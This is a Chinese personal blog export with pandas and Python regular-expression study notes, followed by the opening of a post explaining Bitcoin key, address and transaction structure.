<h3 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h3><p>Series 类似于一维数组的对象，由一组数据以及相关的索引组成<br>生成、读取属性<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line"><span class="comment">############从序列中生成</span></div><div class="line">se=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</div><div class="line"><span class="keyword">print</span> se</div><div class="line"><span class="comment">#索引 数据</span></div><div class="line"><span class="comment"># 0    1</span></div><div class="line"><span class="comment"># 1    2</span></div><div class="line"><span class="comment"># 2    3</span></div><div class="line"><span class="comment"># 3    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line">se=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="keyword">print</span> se</div><div class="line"><span class="comment"># a    1</span></div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line"><span class="comment">#################从字典中生成</span></div><div class="line">sdata=&#123;<span class="string">'num1'</span>:<span class="number">1</span>,<span class="string">'num2'</span>:<span class="number">2</span>,<span class="string">'num3'</span>:<span class="number">3</span>&#125;</div><div class="line">obj2=Series(sdata)</div><div class="line"><span class="keyword">print</span> obj2</div><div class="line"><span class="comment"># num1    1</span></div><div class="line"><span class="comment"># num2    2</span></div><div class="line"><span class="comment"># num3    3</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line"><span class="comment">#################从字典中生成，按照index排序，重构</span></div><div class="line">sdata=&#123;<span class="string">'num1'</span>:<span class="number">1</span>,<span class="string">'num2'</span>:<span class="number">2</span>,<span class="string">'num3'</span>:<span class="number">3</span>&#125;</div><div class="line">states=[<span class="string">'num2'</span>,<span class="string">'num1'</span>,<span class="string">'name'</span>]</div><div class="line">obj2=Series(sdata,index=states)</div><div class="line"><span class="keyword">print</span> obj2</div><div class="line"><span class="comment">#  索引  数据</span></div><div class="line"><span class="comment"># num2    2.0</span></div><div class="line"><span class="comment"># num1    1.0</span></div><div class="line"><span class="comment"># name    NaN</span></div><div class="line"><span class="comment"># dtype: float64</span></div><div class="line"><span class="comment">###########属性</span></div><div class="line"><span class="keyword">print</span> se.values,se.index </div><div class="line"><span class="comment">#[1 2 3 4] Index([u'a', u'b', u'c', u'd'], dtype='object')</span></div></pre></td></tr></table></figure></p>
<h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>不支持切片取数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">obj=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="comment">###########按照索引读取值</span></div><div class="line"><span class="keyword">print</span> obj[<span class="string">'a'</span>] </div><div class="line"><span class="comment"># 1</span></div><div class="line"><span class="comment">###########按照索引序列读取行</span></div><div class="line"><span class="keyword">print</span> obj[[<span class="string">'a'</span>,<span class="string">'b'</span>]] </div><div class="line"><span class="comment"># a    1</span></div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># dtype: int64</span></div><div class="line"><span class="comment">###########按照布尔Series取行</span></div><div class="line">a=Series(&#123;<span class="string">'a'</span>:<span class="keyword">True</span>,<span class="string">'b'</span>:<span class="keyword">True</span>,<span class="string">'c'</span>:<span class="keyword">True</span>,<span class="string">'d'</span>:<span class="keyword">False</span>&#125;)</div><div class="line"><span class="keyword">print</span> obj[a]</div><div class="line"><span class="comment"># a    1</span></div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># c    3</span></div></pre></td></tr></table></figure></p>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>del<br>只能删除一个 obj[‘’]<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">obj=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="keyword">del</span> obj[<span class="string">'a'</span>]</div><div class="line"><span class="keyword">print</span> obj</div><div class="line"><span class="comment"># b    2</span></div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div></pre></td></tr></table></figure></p>
<p>drop<br>删除一个(‘’) 删除多个([‘’,’’])<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line">obj=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="keyword">print</span> obj.drop([<span class="string">'a'</span>,<span class="string">'b'</span>])</div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div></pre></td></tr></table></figure></p>
<h4 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h4><p>numpy DataFrame 同理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> obj&gt;pbj.median()</div><div class="line"><span class="comment"># a    False</span></div><div class="line"><span class="comment"># b    False</span></div><div class="line"><span class="comment"># c     True</span></div><div class="line"><span class="comment"># d     True</span></div><div class="line"><span class="keyword">print</span> obj[obj&gt;obj.median()]  <span class="comment">#原理 按照布尔Series取数</span></div><div class="line"><span class="comment"># c    3</span></div><div class="line"><span class="comment"># d    4</span></div><div class="line"><span class="comment"># dtype: int64</span></div></pre></td></tr></table></figure></p>
<p>isnull notnull函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd </div><div class="line">a=&#123;<span class="string">'ok'</span>:<span class="number">1</span>,<span class="string">'go'</span>:<span class="number">2</span>,<span class="string">'od'</span>:<span class="number">3</span>&#125;</div><div class="line">obj=pd.Series(a,index=[<span class="string">'ok'</span>,<span class="string">'go'</span>,<span class="string">'od'</span>,<span class="string">'fi'</span>])</div><div class="line"><span class="keyword">print</span> pd.isnull(obj)</div><div class="line">ok    <span class="keyword">False</span></div><div class="line">go    <span class="keyword">False</span></div><div class="line">od    <span class="keyword">False</span></div><div class="line">fi     <span class="keyword">True</span></div><div class="line">dtype: bool</div></pre></td></tr></table></figure></p>
<p>Series运算，索引取并集，索引相同之间运算，索引不同显示NaN</p>
<h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><p>表格型数据结构<br>有行索引，有列索引<br>列的地位比行的高</p>
<h4 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">####################通过等长列表生成</span></div><div class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> *</div><div class="line">data1=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,],[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],[<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]]</div><div class="line">frame=DataFrame(data1)</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#    0   1   2   3</span></div><div class="line"><span class="comment"># 0  1   2   3   4</span></div><div class="line"><span class="comment"># 1  5   6   7   8</span></div><div class="line"><span class="comment"># 2  9  10  11  12</span></div><div class="line"><span class="comment">#######通过序列或Numpy数组组成的字典生成，字典的键名作为列名</span></div><div class="line">data2=&#123;<span class="string">'num1'</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],<span class="string">'num2'</span>:[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],<span class="string">'num3'</span>:[<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]&#125;</div><div class="line">frame=DataFrame(data2)</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#    num1  num2  num3</span></div><div class="line"><span class="comment"># 0     1     5     9</span></div><div class="line"><span class="comment"># 1     2     6    10</span></div><div class="line"><span class="comment"># 2     3     7    11</span></div><div class="line"><span class="comment"># 3     4     8    12</span></div><div class="line"><span class="comment">#######已经有列名，添加columns作为列序列，按照指定顺序排序</span></div><div class="line">frame=DataFrame(data2,columns=[<span class="string">'num3'</span>,<span class="string">'num2'</span>,<span class="string">'num1'</span>])</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#    num3  num2  num1</span></div><div class="line"><span class="comment"># 0     9     5     1</span></div><div class="line"><span class="comment"># 1    10     6     2</span></div><div class="line"><span class="comment"># 2    11     7     3</span></div><div class="line"><span class="comment"># 3    12     8     4</span></div><div class="line"><span class="comment">##############添加index作为行索引</span></div><div class="line">frame=DataFrame(data2,index=[<span class="string">'one'</span>,<span class="string">'two'</span>,<span class="string">'three'</span>,<span class="string">'four'</span>])</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       1     5     9</span></div><div class="line"><span class="comment"># two       2     6    10</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div><div class="line"><span class="comment">###############嵌套字典生成DataFrame  外层字典的键作为列索引，内层键作为行索引</span></div><div class="line">data2=&#123;<span class="string">'num1'</span>:&#123;<span class="string">'one'</span>:<span class="number">1</span>,<span class="string">'two'</span>:<span class="number">2</span>&#125;,</div><div class="line"><span class="string">'num2'</span>:&#123;<span class="string">'one'</span>:<span class="number">5</span>,<span class="string">'two'</span>:<span class="number">6</span>&#125;,</div><div class="line"><span class="string">'num3'</span>:&#123;<span class="string">'one'</span>:<span class="number">9</span>,<span class="string">'two'</span>:<span class="number">10</span>&#125;&#125;</div><div class="line">frame=DataFrame(data2)</div><div class="line"><span class="keyword">print</span> frame</div><div class="line"><span class="comment">#      num1  num2  num3</span></div><div class="line"><span class="comment"># one     1     5     9</span></div><div class="line"><span class="comment"># two     2     6    10</span></div></pre></td></tr></table></figure>
<h4 id="DataFrame取值赋值-——-变为Series"><a href="#DataFrame取值赋值-——-变为Series" class="headerlink" title="DataFrame取值赋值 —— 变为Series"></a>DataFrame取值赋值 —— 变为Series</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       1     5     9</span></div><div class="line"><span class="comment"># two       2     6    10</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div><div class="line"><span class="comment">###############通过列名选取列数据,更改列数据（也可添加）</span></div><div class="line"><span class="keyword">print</span> frame[<span class="string">'num1'</span>]</div><div class="line"><span class="comment"># one      1</span></div><div class="line"><span class="comment"># two      2</span></div><div class="line"><span class="comment"># three    3</span></div><div class="line"><span class="comment"># four     4</span></div><div class="line">frame[<span class="string">'num1'</span>]=np.arange(<span class="number">4</span>)</div><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       0     5     9</span></div><div class="line"><span class="comment"># two       1     6    10</span></div><div class="line"><span class="comment"># three     2     7    11</span></div><div class="line"><span class="comment"># four      3     8    12</span></div><div class="line"><span class="comment">#################通过index选择行，通过index位置选择行</span></div><div class="line"><span class="keyword">print</span> frame.loc[<span class="string">'one'</span>]</div><div class="line"><span class="keyword">print</span> frame.iloc[<span class="number">0</span>]</div><div class="line"><span class="comment"># num1    1</span></div><div class="line"><span class="comment"># num2    5</span></div><div class="line"><span class="comment"># num3    9</span></div><div class="line"><span class="comment">###################删除 del drop</span></div><div class="line"><span class="comment">###################axis=1按列 axis=0按行 默认0</span></div><div class="line"><span class="keyword">del</span> frame[<span class="string">'num1'</span>]  <span class="comment">#只能用于列</span></div><div class="line"><span class="comment">#        num2  num3</span></div><div class="line"><span class="comment"># one       5     9</span></div><div class="line"><span class="comment"># two       6    10</span></div><div class="line"><span class="comment"># three     7    11</span></div><div class="line"><span class="comment"># four      8    12</span></div><div class="line"><span class="keyword">print</span> frame.drop([<span class="string">'num1'</span>,<span class="string">'num2'</span>],axis=<span class="number">1</span>)   <span class="comment">#删列，返回一个删除了的新对象</span></div><div class="line"><span class="comment">#        num3</span></div><div class="line"><span class="comment"># one       9</span></div><div class="line"><span class="comment"># two      10</span></div><div class="line"><span class="comment"># three    11</span></div><div class="line"><span class="comment"># four     12</span></div><div class="line"><span class="keyword">print</span> frame.drop([<span class="string">'one'</span>,<span class="string">'two'</span>])         <span class="comment">#删行，返回一个删除了的新对象</span></div><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div></pre></td></tr></table></figure>
<h4 id="选取"><a href="#选取" class="headerlink" title="选取"></a>选取</h4><ol>
<li>行切片 <code>data[1:2]</code> 选取行</li>
<li>布尔型序列 <code>data[[True,False,True,False]]</code> 选取行</li>
<li>布尔型DataFrame过滤 <code>data[data&lt;9]</code> 返回原格式 不满足变为NaN</li>
<li>frame.ix[行索引] （行索引为一个时，结果为Series，多个用序列表示,返回DataFrame）</li>
<li>frame.ix[:,列索引] （行索引为一个时，结果为Series，多个用序列表示,返回DataFrame）</li>
<li>frame.ix[[行索引],[列索引]]<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#        num1  num2  num3</span></div><div class="line"><span class="comment"># one       1     5     9</span></div><div class="line"><span class="comment"># two       2     6    10</span></div><div class="line"><span class="comment"># three     3     7    11</span></div><div class="line"><span class="comment"># four      4     8    12</span></div><div class="line"><span class="keyword">print</span> frame.ix[<span class="string">'one'</span>]</div><div class="line"><span class="comment"># num1    1</span></div><div class="line"><span class="comment"># num2    5</span></div><div class="line"><span class="comment"># num3    9</span></div><div class="line"><span class="comment"># Name: one, dtype: int64</span></div><div class="line"><span class="keyword">print</span> data.ix[[<span class="string">'one'</span>,<span class="string">'two'</span>],[<span class="string">'num1'</span>,<span class="string">'num2'</span>]]</div><div class="line"><span class="comment">#      num1  num2</span></div><div class="line"><span class="comment"># one     1     5</span></div><div class="line"><span class="comment"># two     2     6</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="重新索引"><a href="#重新索引" class="headerlink" title="重新索引"></a>重新索引</h4><p>DataFrame 同理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">se=Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],index=[<span class="string">'one'</span>,<span class="string">'two'</span>,<span class="string">'three'</span>])</div><div class="line"><span class="keyword">print</span> se</div><div class="line"><span class="comment"># one      1</span></div><div class="line"><span class="comment"># two      2</span></div><div class="line"><span class="comment"># three    3</span></div><div class="line">se2=se.reindex([<span class="string">'one'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>],fill_value=<span class="number">0</span>) <span class="comment">#fill_value默认缺失值，默认为NaN</span></div><div class="line"><span class="keyword">print</span> se2</div><div class="line"><span class="comment"># one    1</span></div><div class="line"><span class="comment"># b      0</span></div><div class="line"><span class="comment"># c      0</span></div></pre></td></tr></table></figure></p>
<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>按照行列索引进行字典排序<br>axis=0 按照行索引   axis=1 按照列索引<br>ascending=True 按照升序  False 按照降序<br>frame.sort_index(axis=0,ascending=True)</p>
<h4 id="文件加载、写入"><a href="#文件加载、写入" class="headerlink" title="文件加载、写入"></a>文件加载、写入</h4><p>将表格性数据读取为DataFrame对象<br>read_csv()<br>从文件、URL、文件型对象中加载带分隔符的数据，默认分隔符为<strong>逗号</strong><br>read_table()<br>从文件、URL、文件型对象中加载带分隔符的数据，默认分隔符为<strong>制表符</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line"><span class="comment">#####文件内容没有自带列索引，分配默认列名</span></div><div class="line">df=pd.read_csv(<span class="string">'文件路径'</span>,header=<span class="keyword">None</span>)</div><div class="line"><span class="comment">#####文件内容没有自带列索引，自己定义列名</span></div><div class="line">df=pd.read_csv(<span class="string">'文件路径'</span>,names=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</div><div class="line"><span class="comment">#####文件内容没有自带列索引，自己定义列名，指定一列内容作为行索引</span></div><div class="line">df=pd.read_csv(<span class="string">'文件路径'</span>,names=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]，index_col=<span class="string">'d'</span>)</div><div class="line"><span class="comment">##参数sep 指定拆分字符序列 或 正则表达式</span></div><div class="line"><span class="comment">##参数na_values=['NULL'] 指定缺失值 也可用字典指定每列不同值填充为缺失</span></div><div class="line"><span class="comment">##参数encoding=utf8 指定解码形式</span></div><div class="line"><span class="comment">#########文件写入到一个以逗号分隔的文件中</span></div><div class="line">df.to_csv(<span class="string">'文件路径'</span>)</div><div class="line"><span class="comment">##参数na_rep='NULL' 指定输出缺失值</span></div><div class="line"><span class="comment">##参数index=False 指定不写行索引</span></div><div class="line"><span class="comment">##参数header=None 指定不写列索引</span></div><div class="line"><span class="comment">##参数columns=[]  指定要写入的列索引名</span></div><div class="line"><span class="comment">##参数seq='|'     指定分隔符</span></div></pre></td></tr></table></figure></p>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>导入模块<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line">s=<span class="string">'123abc456eabc789'</span></div><div class="line"><span class="keyword">print</span> re.findall(<span class="string">r'abc'</span>,s,re.I)</div></pre></td></tr></table></figure></p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>re.I : 忽略大小写<br>re.M : 多行匹配，影响^和$<br>re.S : 使.匹配包括换行在内的所有字符</p>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><p>‘.’ : 匹配除了换行符外的任意一个字符<br>‘^’ : 行首<br>‘$’ : 行末<br>‘\A’: 整个字符串开头<br>‘\Z’: 整个字符串结尾<br>‘\b’: 匹配单词的分割，一个单词的前后都有<br>‘\B’: [^\b]<br>‘|’ : 或，匹配子表达式中的一个，用（）圈定范围,没用（）则表示整个字符串<br>‘?’ : 表示?前一个元素是有可有无的，用（）圈定元素<br>‘+’ : 表示+前一个元素出现一次或多次 &gt;=1 ，用（）圈定元素<br>‘<em>‘ : 表示\</em>前一个元素出现任意多次   &gt;=0 ，用（）圈定元素<br>‘+?’: 表示懒惰模式，满足之后的需求，+所匹配的次数尽可能少<br>‘<em>?’: 表示懒惰模式，满足之后的需求，\</em>所匹配的次数尽可能少<br>‘??’: 表示懒惰模式，满足之后的需求，?尽可能匹配0次<br>‘{min,max}?’： 表示懒惰模式，满足之后的需求，{}匹配的次数尽可能少</p>
<h3 id="字符组"><a href="#字符组" class="headerlink" title="字符组 []"></a>字符组 []</h3><p><strong>字符组</strong>：匹配字符组内的若干字符之一<br>如：[ae] 匹配 a或e<br>字符组中的两种<strong>特殊字符</strong>：<br>‘-‘ : 当’-‘不在字符组开头时，表示范围<br>如：[0-9][a-z][A-z] 等于 [0-9a-zA-Z]<br>‘^’ : 当’^’在字符组开头是，表示排除，匹配除了之后字符以外的字符<br>如：[^1-6] 除了1~6以外的字符<br><strong>预定字符集</strong>（可以不写在[]中）：<br>\d : 数字[0-9]<br>\D ：非数字[^\d]<br>\s : 空白字符[ \t\r\n\f\v]<br>\S : 非空白字符[^\s]<br>\w : 单词字符[A-Za-z0-9_] #有下划线<br>\W : 非单词字符[^\w]<br>\number : 表示跟编号为number的括号（）匹配内容相同的一个字符串 （不是表达式相同）</p>
<h3 id="出现次数范围"><a href="#出现次数范围" class="headerlink" title="出现次数范围"></a>出现次数范围</h3><p>限定{}前面的元素重现次数<br>{num} 固定次数<br>{min,max} 次数范围<br>如 [a-zA-Z]{1,5} 匹配1~5个大小写字母<br>? 等于 {0,1}</p>
<h3 id="（）"><a href="#（）" class="headerlink" title="（）"></a>（）</h3><p>每个括号都有一个编号，从左往右，从1开始<br>1.记忆被匹配到的文本<br>    多个（）一一对应多个变量<br>2.用于|的多选项范围<br>    （）内加 ?: 不记忆这部分被匹配到的内容<br>3.用于? * +的量词作用范围<br>    （）内加 ?: 不记忆这部分被匹配到的内容<br>4.指定别名<br>(?P<name>…) 指定一个别名<br>(?P=name) 引用别名为name的分组匹配到的字符串</name></p>
<p>对于以上<strong>所有</strong>用到的特殊字符，用转义字符’\’来表示本身<br>如 ([a-z]+) ==&gt; (very)</p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[比特币&区块链与交易]]></title>
      <url>/2017/12/27/%E6%AF%94%E7%89%B9%E5%B8%81&amp;%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8E%E4%BA%A4%E6%98%93/</url>
      <content type="html"><![CDATA[<p>— 交易与脚本 —<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>区块的内容就是交易，下面介绍比特币的具体交易，也就是账单的内容。<br>但是对于其中脚本的部分，也了解甚微。在这里就提个大概。</p>
<h2 id="比特币钱包"><a href="#比特币钱包" class="headerlink" title="比特币钱包"></a>比特币钱包</h2><p>首先需要了解一些专用词</p>
<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p><strong>比特币地址</strong>：比特币地址是一个由数字和字母组成的字符串，比特币“账户”的唯一标识，如: 1JwSSubhmg6iPtRjtyqhUYYH76Zg3Lfy1T (以1或3开头，长度25字节；base58解码后，为34或35个字符)。有地址对应“密钥”的人，拥有这个地址里的比特币</p>
<p><strong>公钥</strong>：有两种形式：压缩与非压缩；早期使用非压缩（65字节，0x04开头），现在默认压缩（32字节，0x02/0x03开头）。非压缩公钥左右两个32字节有关联，因而可以压缩。<br>一个公钥具有两种形式，所以对应两个比特币地址。这两个比特币地址都可由同一私钥签署交易。</p>
<p><strong>私钥</strong>：巨大的随机整数（256位、32字节），介于:1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的数。</p>
<p><strong>BASE58</strong>：Base58是用于比特币中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址和私钥。相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/“符号。这样做的主要原因是为了肉眼容易识别，在输入的时候不容易打错，</p>
<p><strong>私钥字符串</strong>：因为私钥太长，识别度低，不容易记忆。私钥字符串就是对于原始的随机数进行一定的转换，转换为识别率高的形式。通过BASE58转换成WIF（Wallet import Format)格式的私钥。也可以把私钥转换其他形式，比如以单词的形式(12或者24个单词)，脑钱包的形式,又或者自己记住的某一句话来生成私钥，注意脑钱包生成的私钥随机的安全性并不高。</p>
<ul>
<li>私钥字符串开头的第一位的不同，是用来区分该私钥使用的公钥是否支持压缩格式</li>
<li>老版本未压缩公钥的私钥字符串是33位byte数组，第一位存放私钥的Version信息，当前值为128，生成的Base58都是以5开头。</li>
</ul>
<blockquote>
<p>老版本未压缩私钥=Base58（version+32位随机数）</p>
</blockquote>
<ul>
<li>支持压缩公钥的私钥字符串是34位byte数组，同样是第一位是version信息，它的值也是128，而多出来的一位是最后一个byte是用来存放是否压缩信息的信息，1就表示是支持压缩格式的公钥。经过Base58处理之后正好是L或者K开头</li>
</ul>
<blockquote>
<p>新版本私钥格式=Base58(version+32位随机数+是否支持压缩)</p>
</blockquote>
<p><strong>私钥到公钥</strong>：由私钥经过SECP256K1算法（椭圆曲线算法）处理得到。</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fmgi1yzm5kj30s40fcgsg.jpg" alt="私钥，公钥，私钥字符串"></p>
<p><strong>公钥到比特币地址</strong>：公钥到地址生成的过程是，先对公钥做一次SHA256(哈希算法)。<br>再经过hash160（一种原始完整性校验消息摘要，160标准对应20字节）处理。<br>在这个20位的byte数组前面再加上一个byte,这个byte就是地址的Version信息，地址的Version当前值为0，Version信息在比特币的test网络上会使用不同的值。<br>再在结尾加上验证信息checksum。在得到的hash160中加入地址的version信息 ，再对该信息做两次SHA-256之后取前4位就是checksum。</p>
<blockquote>
<p>sha-256-hash= SHA-256(public key)<br>hash160=hash160(sha-256-hash)<br>checksum=get_front_four( SHA-256(SHA-256(version+hash160)))<br>address=Base58(version+hash160(SHA-256(public key))+checksum)</p>
</blockquote>
<h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><p>一个数据块中会有多个交易<br>一个完整的交易由以下的元素构成的：</p>
<ul>
<li><strong>版本号</strong> :目前为1（4字节）</li>
<li><strong>输入数量</strong> :正整数（1-9字节） </li>
<li><strong>输入列表</strong> :每块的第一个交易的第一个输入叫做“coinbase”，早期版本中内容被忽略</li>
<li><strong>输出数量</strong> :正整数（1-9字节）</li>
